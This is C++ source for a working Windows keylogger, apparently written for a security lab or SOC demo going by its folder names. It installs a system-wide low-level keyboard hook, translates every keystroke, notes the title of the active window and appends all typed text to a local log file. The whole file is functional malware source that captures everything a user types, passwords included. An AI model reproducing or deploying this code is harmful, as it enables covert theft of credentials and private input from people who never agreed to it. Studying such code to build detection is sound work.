#define UNICODE
#define _UNICODE
#include <windows.h>

namespace {

HHOOK g_keyboardHook = nullptr;
HANDLE g_logFile = INVALID_HANDLE_VALUE;

constexpr wchar_t kLabRoot[] = L"C:\\Users\\lam\\Downloads\\WinAPI-Lab-Safe-SOC-Demo\\WinAPI-Lab";
constexpr wchar_t kLogDir[] = L"C:\\Users\\lam\\Downloads\\WinAPI-Lab-Safe-SOC-Demo\\WinAPI-Lab\\logs";
constexpr wchar_t kLogPath[] = L"C:\\Users\\lam\\Downloads\\WinAPI-Lab-Safe-SOC-Demo\\WinAPI-Lab\\logs\\keylogger.txt";

void EnsureLabDirectories()
{
    CreateDirectoryW(kLabRoot, nullptr);
    CreateDirectoryW(kLogDir, nullptr);
}

void WriteUtf8(const wchar_t* text, int len)
{
    if (len <= 0 || g_logFile == INVALID_HANDLE_VALUE)
        return;

    SetFilePointer(g_logFile, 0, nullptr, FILE_END);

    char utf8[512]{};
    const int utf8Len = WideCharToMultiByte(
        CP_UTF8, 0, text, len, utf8, static_cast<int>(sizeof(utf8)), nullptr, nullptr);

    if (utf8Len > 0) {
        DWORD written = 0;
        WriteFile(g_logFile, utf8, static_cast<DWORD>(utf8Len), &written, nullptr);
    }
}

void LogLine(const wchar_t* text)
{
    const int len = lstrlenW(text);
    WriteUtf8(text, len);
    FlushFileBuffers(g_logFile);
}

void TruncateLastUtf8Char()
{
    if (g_logFile == INVALID_HANDLE_VALUE)
        return;

    LARGE_INTEGER fileSize{};
    if (!GetFileSizeEx(g_logFile, &fileSize) || fileSize.QuadPart == 0)
        return;

    const DWORD tailSize = static_cast<DWORD>(fileSize.QuadPart < 8 ? fileSize.QuadPart : 8);
    LARGE_INTEGER readPos{};
    readPos.QuadPart = fileSize.QuadPart - tailSize;
    SetFilePointerEx(g_logFile, readPos, nullptr, FILE_BEGIN);

    char tail[8]{};
    DWORD read = 0;
    ReadFile(g_logFile, tail, tailSize, &read, nullptr);
    if (read == 0)
        return;

    int charStart = static_cast<int>(read) - 1;
    while (charStart > 0 && (static_cast<unsigned char>(tail[charStart]) & 0xC0) == 0x80)
        --charStart;

    const int trim = static_cast<int>(read) - charStart;
    fileSize.QuadPart -= trim;
    SetFilePointerEx(g_logFile, fileSize, nullptr, FILE_BEGIN);
    SetEndOfFile(g_logFile);
}

// Returns fragment length, 0 to skip, -1 for backspace.
int FormatKeyFragment(wchar_t* out, WPARAM vk, WCHAR ch, int translated)
{
    if (translated == 1) {
        if (ch == L'\r') return wsprintfW(out, L"\r\n");
        if (ch == L'\t') return wsprintfW(out, L"\t");
        if (ch == L'\b') return -1;
        if (ch == L' ')  return wsprintfW(out, L" ");
        if (ch >= 33 && ch != 127) return wsprintfW(out, L"%c", ch);
    }

    switch (vk) {
    case VK_RETURN: return wsprintfW(out, L"\r\n");
    case VK_TAB:    return wsprintfW(out, L"\t");
    case VK_BACK:   return -1;
    case VK_SPACE:  return wsprintfW(out, L" ");
    default:        return 0;
    }
}

bool IsModifierKey(DWORD vk)
{
    switch (vk) {
    case VK_SHIFT:
    case VK_LSHIFT:
    case VK_RSHIFT:
    case VK_CONTROL:
    case VK_LCONTROL:
    case VK_RCONTROL:
    case VK_MENU:
    case VK_LMENU:
    case VK_RMENU:
    case VK_CAPITAL:
        return true;
    default:
        return false;
    }
}

void LogWindowContext(HWND foreground)
{
    static HWND lastHwnd = nullptr;
    static wchar_t lastTitle[256]{};
    if (foreground == lastHwnd) return;
    wchar_t title[256]{};
    GetWindowTextW(foreground, title, 256);
    if (title[0] == L'\0')
        return;

    wchar_t line[320]{};
    const int len = wsprintfW(line, L"\r\n\r\n[WINDOW: %s]\r\n", title);
    WriteUtf8(line, len);

    lastHwnd = foreground;
    lstrcpynW(lastTitle, title, 256);
}

void LogKey(DWORD vk, UINT scanCode)
{
    if (IsModifierKey(vk))
        return;

    if (vk == VK_BACK) {
        TruncateLastUtf8Char();
        FlushFileBuffers(g_logFile);
        return;
    }

    if (vk == VK_PACKET) {
        wchar_t fragment[4]{};
        const int len = wsprintfW(fragment, L"%c", static_cast<WCHAR>(scanCode));
        if (len > 0)
            WriteUtf8(fragment, len);
        FlushFileBuffers(g_logFile);
        return;
    }

    BYTE state[256]{};
    GetKeyboardState(state);
    state[vk & 0xFF] |= 0x80;

    const DWORD threadId = GetWindowThreadProcessId(GetForegroundWindow(), nullptr);
    const HKL layout = GetKeyboardLayout(threadId);

    WCHAR ch[2]{};
    const int translated = ToUnicodeEx(vk, scanCode, state, ch, 1, 0, layout);

    wchar_t fragment[8]{};
    const int len = FormatKeyFragment(fragment, vk, ch[0], translated);

    if (len < 0)
        TruncateLastUtf8Char();
    else if (len > 0)
        WriteUtf8(fragment, len);

    FlushFileBuffers(g_logFile);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        const auto* kbd = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        LogWindowContext(GetForegroundWindow());
        LogKey(kbd->vkCode, kbd->scanCode);
    }

    return CallNextHookEx(g_keyboardHook, nCode, wParam, lParam);
}

bool OpenLogFile()
{
    EnsureLabDirectories();
    g_logFile = CreateFileW(
        kLogPath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ,
        nullptr,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nullptr);
    return g_logFile != INVALID_HANDLE_VALUE;
}

} // namespace

int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int)
{
    if (!OpenLogFile())
        return 1;

    LogLine(L"--- keylogger started ---\r\n");

    g_keyboardHook = SetWindowsHookExW(
        WH_KEYBOARD_LL, KeyboardProc, GetModuleHandleW(nullptr), 0);

    if (!g_keyboardHook) {
        LogLine(L"[ERROR] Failed to install keyboard hook.\r\n");
        CloseHandle(g_logFile);
        return 1;
    }

    MSG msg{};
    while (GetMessageW(&msg, nullptr, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    UnhookWindowsHookEx(g_keyboardHook);
    CloseHandle(g_logFile);
    return 0;
}